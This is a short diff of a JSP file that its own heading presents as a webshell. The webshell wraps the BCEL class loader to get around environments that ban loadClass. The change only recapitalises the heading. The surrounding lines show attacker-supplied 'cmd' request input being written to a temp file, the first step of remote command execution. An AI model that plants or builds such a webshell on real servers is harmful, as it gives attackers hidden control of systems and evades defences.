@@ -23,7 +23,7 @@
 <%@ page import="java.nio.file.Paths" %>
 <html>
 <body>
-<h2>BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP Webshell</h2>
+<h2>BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP WebShell</h2>
 <%
     String tmp = System.getProperty("java.io.tmpdir");
     Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("cmd").getBytes());
